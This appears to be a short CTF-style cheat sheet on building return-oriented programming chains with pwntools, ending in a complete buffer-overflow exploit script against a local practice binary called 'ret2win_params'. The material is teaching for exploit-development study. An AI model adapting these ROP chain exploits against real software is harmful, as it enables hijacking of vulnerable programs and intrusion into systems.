# Return Oriented Programming (ROP)

```
elf = context.binary = ELF("./file", checksec=False)
rop = ROP(elf)
rop.gadgets
rop.rdi #rdi rop object
rop.rsi #rsi rop object
rop.rsi[0] #address
```

## Adding Raw Data and Dumpint ROP Stack
```
rop.raw(0xdeadbeef)
rop.raw(0xcafebabe)
rop.raw(0x12345678)
rop.raw('AAAAAAAA')
print(rop.dump())
```

## Calling Functions
```
context.binary = elf = ELF('/bin/sh')
rop = ROP(elf)
rop.execve(0xdeadbeef)
print(rop.dump())
# 0x0000:           0x61aa pop rdi; ret
# 0x0008:       0xdeadbeef [arg0] rdi = 3735928559
# 0x0010:           0x5824 execve
```

## Sending line
```
p.sendline(rop.chain())
```

Example
```
from pwn import *

elf = context.binary = ELF("./ret2win_params", checksec=False)
p = process(["./ret2win_params"])
rop = ROP(elf)

offset = 16;
payload = b"A" * offset
payload += b"B" * 8
rop.raw(payload)
rop.hacked(0xdeadbeefdeadbeef,0xc0debabec0debabe)
p.sendline(rop.chain())
p.interactive()
```
`print(rop.dump())` will show us the following.
```
0x0000:      b'AAAAAAAA' b'AAAAAAAAAAAAAAAABBBBBBBB'
0x0008:      b'AAAAAAAA'
0x0010:      b'BBBBBBBB'
0x0018:         0x40124b pop rdi; ret
0x0020: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023
0x0028:         0x401249 pop rsi; pop r15; ret
0x0030: 0xc0debabec0debabe [arg1] rsi = 13897750828554304190
0x0038:      b'oaaapaaa' <pad r15>
0x0040:         0x401142 hacked
```

Extract raw bytes
```
print(hexdump(bytes(rop)))
```
